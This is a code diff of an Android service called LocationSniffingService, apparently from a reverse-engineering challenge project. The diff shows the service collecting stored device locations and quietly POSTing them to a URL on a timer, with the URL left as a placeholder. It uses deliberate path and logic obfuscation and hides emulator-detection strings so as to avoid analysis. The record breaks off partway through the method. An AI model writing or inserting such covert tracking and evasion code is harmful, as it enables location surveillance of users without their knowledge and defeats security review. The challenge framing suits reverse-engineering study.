@@ -1,5 +1,4 @@
 package com.woop.tryreverseengineerthis.service;
-
 import android.annotation.TargetApi;
 import android.app.Service;
 import android.content.Intent;
@@ -11,12 +10,9 @@ import android.os.Build;
 import android.os.Debug;
 import android.os.Handler;
 import android.os.IBinder;
-import android.support.annotation.Nullable;
 import android.util.Log;
-
 import com.woop.tryreverseengineerthis.helper.StringHelper;
 import com.woop.tryreverseengineerthis.storage.LocationStorage;
-
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
@@ -25,40 +21,53 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.InvalidKeyException;
 import java.util.List;
-
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 
 /**
+ * Every x seconds, send all the location collected with a POST call to a URL
+ *
  * Created by Jay on 3/29/2016.
  */
 public class LocationSniffingService extends Service{
 
-    private final static String fingerprintStart = "generic";
     private final static String TAG = "LocationSniffingService";
-    @Nullable
+
+    private static Handler mHandler;
+
     @Override
     public IBinder onBind(Intent intent) {
+
+        Log.d(TAG, "Starting handler");
+
+        if(mHandler != null){
+            mHandler = new Handler();
+            int delay = 5;
+
+            //Path Obfuscation
+            mHandler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if(thisDoesnotDoAnything())
+                        return;
+                    else
+                        thisAlsoDoesnotDoAnything();
+                }
+            }, delay);
+        }
         return null;
     }
 
+    //Starts the handler which will post every delay seconds
     @Override
     public void onCreate(){
-
-        Handler handler = new Handler();
-        int delay = 1;
-
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if(thisDoesnotDoAnything())
-                    return;
-                else
-                    thisAlsoDoesnotDoAnything();
-            }
-        }, delay);
     }
-    private void thisAlsoDoesnotDoAnything(){    }
+
+    private void thisAlsoDoesnotDoAnything(){
+
+    }
+
+    //Concats all the locations to send
     private boolean sendQuietly() {
         List<Location> locations = LocationStorage.getAllLocation();
         StringBuilder builder = new StringBuilder();
@@ -73,11 +82,13 @@ public class LocationSniffingService extends Service{
             builder.append(",");
             builder.append("||");
         }
-        sendForReals(builder.toString());
+        actualSend(builder.toString());
+
+        //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
     @TargetApi(Build.VERSION_CODES.KITKAT)
-    private void sendForReals(String s) {
+    private void actualSend(String s) {
         try {
             URL url = new URL("toBeChanged");
             byte[] postData = s.getBytes(StandardCharsets.UTF_8);
@@ -98,131 +109,86 @@ public class LocationSniffingService extends Service{
         } catch (IOException e) {
             e.printStackTrace();
             return;
-        } catch (Exception f){
-            f.printStackTrace();
-            return;
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         Log.d(TAG, "Sent");
     }
+
+
     private boolean thisDoesnotDoAnything(){
+
+        Log.d(TAG,"Checking...");
         boolean b = false;
         if (isValid())
             b = sendQuietly();
-        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
+        Log.d(TAG, isValid() + "");
+
+        return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
+
+    //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
 
-        String h1 = "ï<ŠPSÒí¸U1Éà>";
-        String k1 = "LetmeTellyoua211";
-        String h2 = "ÅhÐ$ h~;ï";
-        String k2 = "astoryab0utab0y1";
-        String h3 = "›«žòóÎÑãl(!º v";
-        String k3 = "n4m3dJackJackJac";
-        String h4 = "óê|Ø†5{•§YúÙ7";
-        String k4 = "heW4sStudying343";
-        String h5 = "j·Òsèfh»oÀ/û¦ˆ“";
-        String k5 = "s0ftw4r3Engineer";
-        String h6 = "vC&Á.ÌŸ/êäÛØp-";
-        String k6 = "j0kessjac21saaaa";
-        String h7 = "¶²=¼†),¼ýh9ÕRs¼";
-        String k7 = "fr33S0ulllllllll";
-        String h8 = "ýxç°|œš14ŽÇ_ü";
-        String k8 = "ind33dind33d3333";
-        String h9 = "ÿRÐÙŒœKÊ¹Ü!Æ4ã%";
-        String k9 = "imtired.........";
-        String h10 = "ôô}]¯Ý.l¥h¤¼|‡";
-        String k10 = "..a..l0ng..night";
-        String h11 = "ˆþŒÀyD!»Vj_$™A";
-        String k11 = "...timetosleep..";
+        Log.d(TAG, "Check if valid");
 
-        String fingerprint = "";
-        String model = "";
-        String manufacturer = "";
-        String product = "";
-        String hardware = "";
-        String telephonyservice = "";
-        String connectivityservice = "";
-        String locationservice = "";
-        String gpsprovider = "";
-        String networkprovider = "";
-        String telephoneoperator = "";
-        try {
-            fingerprint = StringHelper.getStringDynamic(h1, k1);
-            model = StringHelper.getStringDynamic(h2, k2);
-            manufacturer = StringHelper.getStringDynamic(h3, k3);
-            product = StringHelper.getStringDynamic(h4, k4);
-            hardware = StringHelper.getStringDynamic(h5, k5);
-            telephonyservice = StringHelper.getStringDynamic(h6, k6);
-            connectivityservice = StringHelper.getStringDynamic(h7, k7);
-            locationservice = StringHelper.getStringDynamic(h8, k8);
-            gpsprovider = StringHelper.getStringDynamic(h9, k9);
-            networkprovider = StringHelper.getStringDynamic(h10, k10);
-            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
-        } catch (InvalidKeyException e) {
-            e.printStackTrace();
-            return false;
-        } catch (BadPaddingException e) {
-            e.printStackTrace();
-            return false;
-        } catch (IllegalBlockSizeException e) {
-            e.printStackTrace();
-            return false;
-        }
+        String generic = "OnceUponATime";
+        String unknown = "LivedABunnyCalled";
+        String googlesdk = "Judy.SheWasGoingTo";
+        String emulator = "OoposN10earlyforGot";
+        String androidsdk86 = "beTheBestCopIn";
+        String genymotion = "Zo0o0o0o0Topia";
+        String sdk = "SheDidNotRealise";
+        String sdk86 = "however,ThatShe";
+        String vbox = "wasJustGoingtobe";
+        String goldfish = "amereparkingWarden";
+        String android = "sadfacebunny";
 
-        String a1 = "OnceUponATime";
-        String a2 = "LivedABunnyCalled";
-        String a3 = "Judy.SheWasGoingTo";
-        String a4 = "beTheBestCopIn";
-        String a5 = "Zo0o0o0o0Topia";
-        String a6 = "SheDidNotRealise";
-        String a7 = "however,ThatShe";
-        String a8 = "wasJustGoingtobe";
-        String a9 = "amereparkingWarden";
-        String a10 = "sadfacebunny";
-        String a11 = "theend";
-
-        String ak1 = "a1a1a1a1a1a1a1a1";
-        String ak2 = "b2b2b2b2b2b2b2b2";
-        String ak3 = "c3c3c3c3c3c3c3c3";
-        String ak4 = "d4d4d4d4d4d4d4d4";
-        String ak5 = "55eeeeee55ee55ee";
-        String ak6 = "f6f6f6f6f6f6f6f6";
-        String ak7 = "g7g7g7g7g7g7g7g7";
-        String ak8 = "h8h8h8h8h8h8h8h8";
-        String ak9 = "i9i9i9i9i9i9i9i9";
-        String ak10 = "00l0al01la0l0100";
-        String ak11 = "p11p11p11p11p111";
-
-        String generic = "";
-        String unknown = "";
-        String googlesdk = "";
-        String emulator = "";
-        String androidsdk86 = "";
-        String genymotion = "";
-        String sdk = "";
-        String sdk86 = "";
-        String vbox = "";
-        String goldfish = "";
-        String android = "";
+        String fingerprint = "T05FMTExMTExMTExMQ==";
+        String model = "VFdPMjIyMjIyMjIyMg==";
+        String manufacturer = "VEhSRUUzMzMzMzMzMw==";
+        String product = "Rk9VUjQ0NDQ0NDQ0NA==";
+        String hardware = "RklWRTU1NTU1NTU1NQ==";
+        String telephonyservice = "U0lYNjY2NjY2NjY2Ng==";
+        String connectivityservice = "U0lYNjY2NjY2NjY2Ng==";
+        String locationservice = "RUlHSFQ4ODg4ODg4OA==";
+        String gpsprovider = "TklORTk5OTk5OTk5OQ==";
+        String networkprovider = "VEVOMDAwMDAwMDAwMA==";
+        String telephoneoperator = "RUxWRU4xMTExMTExMQ==";
 
         try{
-            generic = StringHelper.getStringStatic(a1, ak1);
-            unknown = StringHelper.getStringStatic(a2, ak2);
-            googlesdk = StringHelper.getStringStatic(a3, ak3);
-            emulator = StringHelper.getStringStatic(a4, ak4);
-            androidsdk86 = StringHelper.getStringStatic(a5, ak5);
-            genymotion = StringHelper.getStringStatic(a6, ak6);
-            sdk = StringHelper.getStringStatic(a7, ak7);
-            sdk86 = StringHelper.getStringStatic(a8, ak8);
-            vbox = StringHelper.getStringStatic(a9, ak9);
-            goldfish = StringHelper.getStringStatic(a10, ak10);
-            android = StringHelper.getStringStatic(a11, ak11);
+            generic = StringHelper.getStringStatic(generic);
+            unknown = StringHelper.getStringStatic(unknown);
+            googlesdk = StringHelper.getStringStatic(googlesdk);
+            emulator = StringHelper.getStringStatic(emulator);
+            androidsdk86 = StringHelper.getStringStatic(androidsdk86);
+            genymotion = StringHelper.getStringStatic(genymotion);
+            sdk = StringHelper.getStringStatic(sdk);
+            sdk86 = StringHelper.getStringStatic(sdk86);
+            vbox = StringHelper.getStringStatic(vbox);
+            goldfish = StringHelper.getStringStatic(goldfish);
+            android = StringHelper.getStringStatic(android);
+
+            fingerprint = StringHelper.getStringDynamic(fingerprint);
+            model = StringHelper.getStringDynamic(model);
+            manufacturer = StringHelper.getStringDynamic(manufacturer);
+            product = StringHelper.getStringDynamic(product);
+            hardware = StringHelper.getStringDynamic(hardware);
+            telephonyservice = StringHelper.getStringDynamic(telephonyservice);
+            connectivityservice = StringHelper.getStringDynamic(connectivityservice);
+            locationservice = StringHelper.getStringDynamic(locationservice);
+            gpsprovider = StringHelper.getStringDynamic(gpsprovider);
+            networkprovider = StringHelper.getStringDynamic(networkprovider);
+            telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
         } catch (IllegalBlockSizeException e) {
             e.printStackTrace();
+            return false;
         } catch (BadPaddingException e) {
             e.printStackTrace();
+            return false;
         } catch (InvalidKeyException e) {
             e.printStackTrace();
+            return false;
         }
 
         //Check build's fingerprint
